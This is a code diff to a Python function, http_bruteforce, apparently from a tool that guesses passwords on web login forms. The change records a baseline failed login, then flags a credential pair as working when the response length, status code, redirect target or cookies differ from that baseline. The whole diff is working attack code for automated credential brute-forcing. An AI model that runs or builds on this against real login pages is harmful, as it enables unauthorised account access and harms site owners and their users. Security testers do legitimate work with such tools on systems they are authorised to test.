@@ -15,13 +15,25 @@ def http_bruteforce(ip, port=80):
 
     use_username = input("[?] Does the site require a username? (y/n): ").strip().lower() == 'y'
 
-    username_field = input("[?] Enter the name of the username field (default: 'username'): ").strip()
-    if not username_field:
-        username_field = "username"
+    username_field = input("[?] Enter the name of the username field (default: 'username'): ").strip() or "username"
+    password_field = input("[?] Enter the name of the password field (default: 'password'): ").strip() or "password"
 
-    password_field = input("[?] Enter the name of the password field (default: 'password'): ").strip()
-    if not password_field:
-        password_field = "password"
+    # Baseline failed login to capture "failure fingerprint"
+    session.cookies.clear()
+    fail_data = {password_field: "invalidpass"}
+    if use_username:
+        fail_data[username_field] = "invaliduser"
+
+    try:
+        fail_resp = session.post(url, data=fail_data, headers=headers, timeout=5, allow_redirects=False)
+    except requests.RequestException as e:
+        print(f"[!] Failed to get baseline response: {e}")
+        return None
+
+    baseline_length = len(fail_resp.text)
+    baseline_status = fail_resp.status_code
+    baseline_redirect = fail_resp.headers.get("Location", "")
+    baseline_cookies = set(session.cookies.get_dict().keys())
 
     for username, password in creds:
         try:
@@ -35,18 +47,28 @@ def http_bruteforce(ip, port=80):
                 url,
                 data=form_data,
                 headers=headers,
-                timeout=5
+                timeout=5,
+                allow_redirects=False  # for redirect detection
             )
 
-            auth_cookies = {
-                k: v for k, v in session.cookies.get_dict().items()
-                if 'session' in k.lower() or 'auth' in k.lower() or 'token' in k.lower()
-            }
+            response_cookies = set(session.cookies.get_dict().keys())
+            new_cookies = response_cookies - baseline_cookies
 
-            if auth_cookies:
+            # Compare with baseline to detect success
+            diff_len = abs(len(response.text) - baseline_length) > 50
+            diff_status = response.status_code != baseline_status
+            diff_redirect = response.headers.get("Location", "") != baseline_redirect
+            has_new_auth_cookies = any(
+                k.lower() in ['sessionid', 'session', 'auth', 'token']
+                for k in response_cookies
+            ) or bool(new_cookies)
+
+            confidence = sum([diff_len, diff_status, diff_redirect, has_new_auth_cookies])
+
+            if confidence >= 2:
                 user_display = f"{username}:{password}" if use_username else f"{password}"
-                print(f"[+] HTTP login success: {user_display}")
-                print(f"    -> Session cookies: {auth_cookies}")
+                print(f"[+] HTTP login likely successful: {user_display}")
+                print(f"    -> Response: status {response.status_code}, cookies: {response_cookies}")
                 return (username, password) if use_username else (None, password)
 
         except requests.RequestException as e:
